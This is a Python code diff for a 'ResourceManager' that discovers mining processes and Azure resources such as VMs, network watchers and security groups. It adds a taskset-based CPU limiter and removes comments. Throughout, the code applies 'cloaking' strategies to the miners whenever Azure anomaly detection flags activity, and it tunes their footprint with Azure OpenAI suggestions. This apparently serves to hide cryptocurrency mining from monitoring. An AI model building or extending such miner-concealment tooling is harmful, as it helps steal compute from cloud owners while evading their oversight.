@@ -28,7 +28,8 @@ from .azure_clients import (
     AzureOpenAIClient            # Thêm client mới
 )
 
-from .auxiliary_modules.cgroup_manager import assign_process_to_cgroups
+# Gỡ bỏ import cgroup_manager
+# from .auxiliary_modules.cgroup_manager import assign_process_to_cgroups
 from .auxiliary_modules import temperature_monitor
 
 from .auxiliary_modules.power_management import (
@@ -37,6 +38,57 @@ from .auxiliary_modules.power_management import (
     set_gpu_usage,
     shutdown_power_management
 )
+
+
+# ----------------------------
+# Hàm thay thế assign_process_to_cgroups
+# ----------------------------
+def assign_process_resources(pid: int, resources: Dict[str, Any], process_name: str, logger: logging.Logger):
+    """
+    Hàm thay thế cho assign_process_to_cgroups, áp dụng các điều chỉnh tài nguyên thông qua 
+    các cơ chế hệ thống hoặc ghi log cảnh báo nếu không thể áp dụng tương đương.
+
+    Args:
+        pid (int): PID của tiến trình cần điều chỉnh.
+        resources (Dict[str, Any]): Từ điển chứa các tham số cần điều chỉnh, ví dụ:
+            {
+                'cpu_threads': int,
+                'memory': int (MB),
+                'cpu_freq': int (MHz),
+                'disk_io_limit_mbps': float,
+                ...
+            }
+        process_name (str): Tên tiến trình.
+        logger (logging.Logger): Logger để ghi nhận log.
+    """
+
+    # Điều chỉnh CPU threads bằng taskset (Linux)
+    if 'cpu_threads' in resources:
+        try:
+            cpu_count = psutil.cpu_count(logical=True)
+            desired_threads = resources['cpu_threads']
+            if desired_threads > cpu_count or desired_threads <= 0:
+                logger.warning(f"Số luồng CPU yêu cầu ({desired_threads}) không hợp lệ. Bỏ qua.")
+            else:
+                # Lấy danh sách CPU cores từ 0 đến desired_threads-1
+                cores = ",".join(map(str, range(desired_threads)))
+                subprocess.run(['taskset', '-cp', cores, str(pid)], check=True)
+                logger.info(f"Đã áp dụng giới hạn {desired_threads} luồng CPU cho tiến trình {process_name} (PID: {pid}).")
+        except Exception as e:
+            logger.error(f"Lỗi khi điều chỉnh luồng CPU bằng taskset cho {process_name} (PID: {pid}): {e}")
+
+    # Điều chỉnh RAM allocation: Không có cgroup, chỉ ghi log
+    if 'memory' in resources:
+        logger.warning(f"Không thể giới hạn RAM cho tiến trình {process_name} (PID: {pid}) do không có cgroup_manager. Bỏ qua.")
+
+    # Điều chỉnh CPU frequency: Không có cgroup, chỉ ghi log
+    if 'cpu_freq' in resources:
+        logger.warning(f"Không thể trực tiếp điều chỉnh tần số CPU cho tiến trình {process_name} (PID: {pid}) mà không sử dụng cgroup. Bỏ qua.")
+
+    # Điều chỉnh Disk I/O limit: Không có cgroup, chỉ ghi log
+    if 'disk_io_limit_mbps' in resources:
+        logger.warning(f"Không thể trực tiếp điều chỉnh Disk I/O cho tiến trình {process_name} (PID: {pid}) mà không sử dụng cgroup. Bỏ qua.")
+
 
 # ----------------------------
 # SharedResourceManager Class
@@ -50,14 +102,12 @@ class SharedResourceManager:
     def __init__(self, config: Dict[str, Any], logger: logging.Logger):
         self.config = config
         self.logger = logger
-
-        # Thêm thuộc tính để lưu trữ trạng thái tài nguyên ban đầu của các tiến trình
         self.original_resource_limits = {}
 
     def adjust_cpu_threads(self, pid: int, cpu_threads: int, process_name: str):
         """Điều chỉnh số luồng CPU."""
         try:
-            assign_process_to_cgroups(pid, {'cpu_threads': cpu_threads}, process_name, self.logger)
+            assign_process_resources(pid, {'cpu_threads': cpu_threads}, process_name, self.logger)
             self.logger.info(f"Điều chỉnh số luồng CPU xuống {cpu_threads} cho tiến trình {process_name} (PID: {pid}).")
         except Exception as e:
             self.logger.error(f"Lỗi khi điều chỉnh số luồng CPU cho tiến trình {process_name} (PID: {pid}): {e}")
@@ -65,7 +115,7 @@ class SharedResourceManager:
     def adjust_ram_allocation(self, pid: int, ram_allocation_mb: int, process_name: str):
         """Điều chỉnh giới hạn RAM."""
         try:
-            assign_process_to_cgroups(pid, {'memory': ram_allocation_mb}, process_name, self.logger)
+            assign_process_resources(pid, {'memory': ram_allocation_mb}, process_name, self.logger)
             self.logger.info(f"Điều chỉnh giới hạn RAM xuống {ram_allocation_mb}MB cho tiến trình {process_name} (PID: {pid}).")
         except Exception as e:
             self.logger.error(f"Lỗi khi điều chỉnh RAM cho tiến trình {process_name} (PID: {pid}): {e}")
@@ -95,7 +145,7 @@ class SharedResourceManager:
                 self.config["resource_allocation"]["disk_io"]["min_limit_mbps"],
                 min(new_limit, self.config["resource_allocation"]["disk_io"]["max_limit_mbps"])
             )
-            assign_process_to_cgroups(process.pid, {'disk_io_limit_mbps': new_limit}, process.name, self.logger)
+            assign_process_resources(process.pid, {'disk_io_limit_mbps': new_limit}, process.name, self.logger)
             self.logger.info(f"Điều chỉnh giới hạn Disk I/O xuống {new_limit} Mbps cho tiến trình {process.name} (PID: {process.pid}).")
         except Exception as e:
             self.logger.error(f"Lỗi khi điều chỉnh Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}")
@@ -111,7 +161,7 @@ class SharedResourceManager:
     def adjust_cpu_frequency(self, pid: int, frequency: int, process_name: str):
         """Điều chỉnh tần số CPU."""
         try:
-            assign_process_to_cgroups(pid, {'cpu_freq': frequency}, process_name, self.logger)
+            assign_process_resources(pid, {'cpu_freq': frequency}, process_name, self.logger)
             self.logger.info(f"Đặt tần số CPU xuống {frequency}MHz cho tiến trình {process_name} (PID: {pid}).")
         except Exception as e:
             self.logger.error(f"Lỗi khi điều chỉnh tần số CPU cho tiến trình {process_name} (PID: {pid}): {e}")
@@ -155,8 +205,8 @@ class SharedResourceManager:
             raise
 
     def configure_network_interface(self, interface: str, bandwidth_limit: float):
-        """Cấu hình giao diện mạng."""
-        # Chèn logic thực tế cấu hình QoS hoặc tc command, iptables, ...
+        """Cấu hình giao diện mạng (ví dụ sử dụng tc)."""
+        # Nơi để chèn logic thực tế cấu hình QoS/TC nếu cần.
         pass
 
     def throttle_cpu_based_on_load(self, process: MiningProcess, load_percent: float):
@@ -176,10 +226,6 @@ class SharedResourceManager:
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
         """
         Áp dụng một chiến lược cloaking cụ thể cho tiến trình và lưu trạng thái tài nguyên ban đầu.
-
-        Args:
-            strategy_name (str): Tên chiến lược cloaking.
-            process (MiningProcess): Tiến trình cần áp dụng cloaking.
         """
         try:
             self.logger.debug(f"Đang tạo chiến lược {strategy_name} cho tiến trình {process.name} (PID: {process.pid})")
@@ -227,9 +273,6 @@ class SharedResourceManager:
     def restore_resources(self, process: MiningProcess):
         """
         Khôi phục tài nguyên cho tiến trình sau khi đã xác nhận an toàn từ AnomalyDetector.
-
-        Args:
-            process (MiningProcess): Tiến trình cần khôi phục tài nguyên.
         """
         try:
             pid = process.pid
@@ -276,9 +319,10 @@ class SharedResourceManager:
             self.logger.error(f"Lỗi khi khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}): {e}")
             raise
 
-    # ----------------------------
-    # ResourceManager Singleton
-    # ----------------------------
+
+# ----------------------------
+# ResourceManager Class
+# ----------------------------
 
 class ResourceManager(BaseManager):
     """
@@ -300,13 +344,9 @@ class ResourceManager(BaseManager):
             return
         self._initialized = True
 
-        # Cấu hình
         self.config = config
         self.model_path = model_path
         self.logger = logger
-
-        # Tải mô hình AI đã loại bỏ
-        # self.resource_optimization_model, self.resource_optimization_device = self.load_model(model_path)  # Loại bỏ dòng này
 
         # Sự kiện để dừng các luồng
         self.stop_event = Event()
@@ -336,10 +376,6 @@ class ResourceManager(BaseManager):
         # Khởi tạo SharedResourceManager
         self.shared_resource_manager = SharedResourceManager(config, logger)
 
-    # ----------------------------
-    # Phương thức khởi tạo và dừng ResourceManager
-    # ----------------------------
-
     def start(self):
         """Khởi động ResourceManager và các luồng quản lý tài nguyên."""
         self.logger.info("Bắt đầu ResourceManager...")
@@ -354,10 +390,6 @@ class ResourceManager(BaseManager):
         self.join_threads()
         self.shutdown_power_management()
         self.logger.info("ResourceManager đã dừng thành công.")
-
-    # ----------------------------
-    # Phương thức khởi tạo và quản lý các luồng
-    # ----------------------------
 
     def initialize_threads(self):
         """Khởi tạo các luồng quản lý tài nguyên."""
@@ -380,10 +412,6 @@ class ResourceManager(BaseManager):
         self.cloaking_thread.join()
         self.resource_adjustment_thread.join()
 
-    # ----------------------------
-    # Phương thức khởi tạo các client Azure
-    # ----------------------------
-
     def initialize_azure_clients(self):
         """Khởi tạo các client Azure."""
         self.azure_monitor_client = AzureMonitorClient(self.logger)
@@ -393,18 +421,8 @@ class ResourceManager(BaseManager):
         self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
         self.azure_traffic_analytics_client = AzureTrafficAnalyticsClient(self.logger)
         self.azure_ml_client = AzureMLClient(self.logger)
-        # Thêm Anomaly Detector và OpenAI Client
         self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
         self.azure_openai_client = AzureOpenAIClient(self.logger, self.config)
-
-    # ----------------------------
-    # Phương thức xử lý tiến trình
-    # ----------------------------
-
-    def get_process_priority(self, process_name: str) -> int:
-        """Lấy mức ưu tiên của tiến trình từ cấu hình."""
-        priority_map = self.config.get('process_priority_map', {})
-        return priority_map.get(process_name.lower(), 1)
 
     def discover_mining_processes(self):
         """Khám phá các tiến trình khai thác dựa trên cấu hình."""
@@ -422,12 +440,13 @@ class ResourceManager(BaseManager):
                     self.mining_processes.append(mining_proc)
             self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
 
-    # ----------------------------
-    # MonitorThread methods
-    # ----------------------------
+    def get_process_priority(self, process_name: str) -> int:
+        """Lấy mức ưu tiên của tiến trình từ cấu hình."""
+        priority_map = self.config.get('process_priority_map', {})
+        return priority_map.get(process_name.lower(), 1)
 
     def monitor_and_adjust(self):
-        """Luồng để theo dõi và gửi yêu cầu điều chỉnh tài nguyên dựa trên nhiệt độ và bất thường."""
+        """Luồng để theo dõi và gửi yêu cầu điều chỉnh tài nguyên."""
         monitoring_params = self.config.get("monitoring_parameters", {})
         temperature_check_interval = monitoring_params.get("temperature_monitoring_interval_seconds", 10)
         power_check_interval = monitoring_params.get("power_monitoring_interval_seconds", 10)
@@ -451,27 +470,23 @@ class ResourceManager(BaseManager):
                 for process in self.mining_processes:
                     self.check_power_and_enqueue(process, cpu_max_power, gpu_max_power)
 
-                # Kiểm tra bất thường thông qua Anomaly Detector
                 if self.should_collect_azure_monitor_data():
                     self.collect_azure_monitor_data()
-                    # Gửi dữ liệu tới anomaly detector
                     metric_data = self.gather_metric_data_for_anomaly_detection()
                     anomalies_detected = self.azure_anomaly_detector_client.detect_anomalies(metric_data)
                     if anomalies_detected:
-                        # Nếu phát hiện bất thường, cloaking ngay
                         for process in self.mining_processes:
                             adjustment_task = {
                                 'type': 'cloaking',
                                 'process': process,
                                 'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                             }
-                            self.resource_adjustment_queue.put((1, adjustment_task))  # ưu tiên cao
+                            self.resource_adjustment_queue.put((1, adjustment_task))
             except Exception as e:
                 self.logger.error(f"Lỗi trong quá trình theo dõi và điều chỉnh: {e}")
             sleep(max(temperature_check_interval, power_check_interval))
 
     def gather_metric_data_for_anomaly_detection(self) -> Dict[str, Any]:
-        # Thu thập dữ liệu metric (CPU, RAM, GPU, Network...) để gửi cho anomaly detector
         data = {}
         with self.mining_processes_lock.gen_rlock():
             for process in self.mining_processes:
@@ -492,7 +507,6 @@ class ResourceManager(BaseManager):
         return data
 
     def allocate_resources_with_priority(self):
-        """Phân bổ tài nguyên dựa trên mức ưu tiên của các tiến trình."""
         with self.resource_lock.gen_wlock(), self.mining_processes_lock.gen_rlock():
             sorted_processes = sorted(self.mining_processes, key=lambda p: p.priority, reverse=True)
             total_cpu_cores = psutil.cpu_count(logical=True)
@@ -529,7 +543,6 @@ class ResourceManager(BaseManager):
                 self.resource_adjustment_queue.put((3, adjustment_task))
 
     def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
-        """Kiểm tra nhiệt độ và gửi yêu cầu điều chỉnh nếu cần."""
         try:
             cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
             gpu_temp = temperature_monitor.get_gpu_temperature(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0
@@ -548,12 +561,11 @@ class ResourceManager(BaseManager):
                     'process': process,
                     'adjustments': adjustments
                 }
-                self.resource_adjustment_queue.put((2, adjustment_task))  # Priority 2
+                self.resource_adjustment_queue.put((2, adjustment_task))
         except Exception as e:
             self.logger.error(f"Lỗi khi kiểm tra nhiệt độ cho tiến trình {process.name} (PID: {process.pid}): {e}")
 
     def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
-        """Kiểm tra công suất và gửi yêu cầu điều chỉnh nếu cần."""
         try:
             cpu_power = get_cpu_power(process.pid)
             gpu_power = get_gpu_power(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0
@@ -572,12 +584,11 @@ class ResourceManager(BaseManager):
                     'process': process,
                     'adjustments': adjustments
                 }
-                self.resource_adjustment_queue.put((2, adjustment_task))  # Priority 2
+                self.resource_adjustment_queue.put((2, adjustment_task))
         except Exception as e:
             self.logger.error(f"Lỗi khi kiểm tra công suất cho tiến trình {process.name} (PID: {process.pid}): {e}")
 
     def should_collect_azure_monitor_data(self) -> bool:
-        """Xác định thời điểm thu thập dữ liệu từ Azure Monitor."""
         if not hasattr(self, '_last_azure_monitor_time'):
             self._last_azure_monitor_time = 0
         current_time = int(time())
@@ -588,19 +599,16 @@ class ResourceManager(BaseManager):
         return False
 
     def collect_azure_monitor_data(self):
-        """Thu thập và xử lý dữ liệu từ Azure Monitor."""
         try:
             for vm in self.vms:
                 resource_id = vm['id']
                 metric_names = ['Percentage CPU', 'Available Memory Bytes']
                 metrics = self.azure_monitor_client.get_metrics(resource_id, metric_names)
                 self.logger.info(f"Thu thập chỉ số từ Azure Monitor cho VM {vm['name']}: {metrics}")
-                # Xử lý các chỉ số và điều chỉnh tài nguyên nếu cần thiết
         except Exception as e:
             self.logger.error(f"Lỗi khi thu thập dữ liệu Azure Monitor: {e}")
 
     def optimize_resources(self):
-        """Luồng để tối ưu hóa tài nguyên dựa trên Azure OpenAI Service."""
         optimization_interval = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
         while not self.stop_event.is_set():
             try:
@@ -610,11 +618,9 @@ class ResourceManager(BaseManager):
 
                 self.allocate_resources_with_priority()
 
-                # Tối ưu hóa tài nguyên dựa trên Azure OpenAI
                 with self.mining_processes_lock.gen_rlock():
                     for process in self.mining_processes:
                         current_state = self.collect_metrics(process)
-                        # Gọi Azure OpenAI để nhận gợi ý tối ưu hóa
                         openai_suggestions = self.azure_openai_client.get_optimization_suggestions(current_state)
 
                         if not openai_suggestions:
@@ -622,7 +628,6 @@ class ResourceManager(BaseManager):
                             continue
 
                         recommended_action = openai_suggestions
-                        
                         self.logger.debug(f"Hành động tối ưu (Azure OpenAI) cho tiến trình {process.name} (PID: {process.pid}): {recommended_action}")
 
                         adjustment_task = {
@@ -630,14 +635,13 @@ class ResourceManager(BaseManager):
                             'process': process,
                             'action': recommended_action
                         }
-                        self.resource_adjustment_queue.put((2, adjustment_task))  # Priority 2
+                        self.resource_adjustment_queue.put((2, adjustment_task))
             except Exception as e:
                 self.logger.error(f"Lỗi trong quá trình tối ưu hóa tài nguyên: {e}")
 
             sleep(optimization_interval)
 
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
-        """Thu thập các chỉ số hiện tại của tiến trình."""
         metrics = {
             'cpu_usage_percent': psutil.Process(process.pid).cpu_percent(interval=1),
             'memory_usage_mb': psutil.Process(process.pid).memory_info().rss / (1024 * 1024),
@@ -649,7 +653,6 @@ class ResourceManager(BaseManager):
         return metrics
 
     def process_cloaking_requests(self):
-        """Xử lý các yêu cầu cloaking từ AnomalyDetector."""
         while not self.stop_event.is_set():
             try:
                 process = self.cloaking_request_queue.get(timeout=1)
@@ -658,19 +661,14 @@ class ResourceManager(BaseManager):
                     'process': process,
                     'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                 }
-                self.resource_adjustment_queue.put((1, adjustment_task))  # Priority 1
+                self.resource_adjustment_queue.put((1, adjustment_task))
                 self.cloaking_request_queue.task_done()
             except Empty:
                 continue
             except Exception as e:
                 self.logger.error(f"Lỗi trong quá trình xử lý yêu cầu cloaking: {e}")
 
-    # ----------------------------
-    # ResourceAdjustmentThread methods
-    # ----------------------------
-
     def resource_adjustment_handler(self):
-        """Luồng xử lý điều chỉnh tài nguyên từ hàng đợi ưu tiên."""
         while not self.stop_event.is_set():
             try:
                 priority, adjustment_task = self.resource_adjustment_queue.get(timeout=1)
@@ -684,7 +682,6 @@ class ResourceManager(BaseManager):
     def execute_adjustment_task(self, adjustment_task):
         task_type = adjustment_task.get('type')
         if task_type is None:
-            # Đây là một nhiệm vụ hàm
             function_name = adjustment_task['function']
             args = adjustment_task.get('args', ())
             kwargs = adjustment_task.get('kwargs', {})
@@ -694,7 +691,6 @@ class ResourceManager(BaseManager):
             else:
                 self.logger.error(f"Không tìm thấy hàm điều chỉnh tài nguyên: {function_name}")
         else:
-            # Đây là một nhiệm vụ với loại cụ thể
             process = adjustment_task['process']
             if task_type == 'cloaking':
                 strategies = adjustment_task['strategies']
@@ -713,12 +709,7 @@ class ResourceManager(BaseManager):
             else:
                 self.logger.warning(f"Loại nhiệm vụ không xác định: {task_type}")
 
-    # ----------------------------
-    # Methods to apply adjustments
-    # ----------------------------
-
     def apply_monitoring_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
-        """Áp dụng các điều chỉnh từ MonitorThread."""
         try:
             if adjustments.get('cpu_cloak'):
                 self.shared_resource_manager.apply_cloak_strategy('cpu', process)
@@ -732,9 +723,7 @@ class ResourceManager(BaseManager):
             self.logger.error(f"Lỗi khi áp dụng điều chỉnh từ MonitorThread cho tiến trình {process.name} (PID: {process.pid}): {e}")
 
     def apply_recommended_action(self, action: List[Any], process: MiningProcess):
-        """Áp dụng các hành động được Azure OpenAI Service đề xuất cho tiến trình."""
         try:
-            # Giả sử action chứa [cpu_threads, ram_allocation_mb, gpu_usage_percent..., disk_io_limit_mbps, network_bandwidth_limit_mbps, cache_limit_percent]
             cpu_threads = int(action[0])
             ram_allocation_mb = int(action[1])
             gpu_usage_percent = []
@@ -745,21 +734,18 @@ class ResourceManager(BaseManager):
             network_bandwidth_limit_mbps = float(action[-2])
             cache_limit_percent = float(action[-1])
 
-            # Điều chỉnh số luồng CPU
             adjustment_task = {
                 'function': 'adjust_cpu_threads',
                 'args': (process.pid, cpu_threads, process.name)
             }
             self.resource_adjustment_queue.put((3, adjustment_task))
 
-            # Điều chỉnh giới hạn RAM
             adjustment_task = {
                 'function': 'adjust_ram_allocation',
                 'args': (process.pid, ram_allocation_mb, process.name)
             }
             self.resource_adjustment_queue.put((3, adjustment_task))
 
-            # Điều chỉnh mức sử dụng GPU
             if gpu_usage_percent:
                 adjustment_task = {
                     'function': 'adjust_gpu_usage',
@@ -769,33 +755,25 @@ class ResourceManager(BaseManager):
             else:
                 self.logger.warning(f"Không có thông tin mức sử dụng GPU để điều chỉnh cho tiến trình {process.name} (PID: {process.pid}).")
 
-            # Điều chỉnh giới hạn Disk I/O
             adjustment_task = {
                 'function': 'adjust_disk_io_limit',
                 'args': (process, disk_io_limit_mbps)
             }
             self.resource_adjustment_queue.put((3, adjustment_task))
 
-            # Điều chỉnh giới hạn băng thông mạng
             adjustment_task = {
                 'function': 'adjust_network_bandwidth',
                 'args': (process, network_bandwidth_limit_mbps)
             }
             self.resource_adjustment_queue.put((3, adjustment_task))
 
-            # Điều chỉnh giới hạn bộ nhớ đệm
             self.shared_resource_manager.apply_cloak_strategy('cache', process)
 
             self.logger.info(f"Áp dụng thành công các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}).")
         except Exception as e:
             self.logger.error(f"Lỗi khi áp dụng các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}): {e}")
 
-    # ----------------------------
-    # Helper methods
-    # ----------------------------
-
     def shutdown_power_management(self):
-        """Giải phóng các tài nguyên quản lý công suất."""
         try:
             shutdown_power_management()
             self.logger.info("Đóng các dịch vụ quản lý công suất thành công.")
@@ -803,25 +781,19 @@ class ResourceManager(BaseManager):
             self.logger.error(f"Lỗi khi đóng các dịch vụ quản lý công suất: {e}")
 
     def discover_azure_resources(self):
-        """Khám phá và lưu trữ các tài nguyên Azure cần thiết."""
         try:
-            # Khám phá các VM
             self.vms = self.azure_monitor_client.discover_resources('Microsoft.Compute/virtualMachines')
             self.logger.info(f"Khám phá {len(self.vms)} Máy ảo.")
 
-            # Khám phá các Network Watcher
             self.network_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
             self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")
 
-            # Khám phá các Network Security Groups (NSGs)
             self.nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
             self.logger.info(f"Khám phá {len(self.nsgs)} Network Security Groups.")
 
-            # Khám phá các Traffic Analytics Workspaces
             self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
             self.logger.info(f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces.")
 
-            # Khám phá các Azure ML Clusters
             self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
             self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
         except Exception as e:
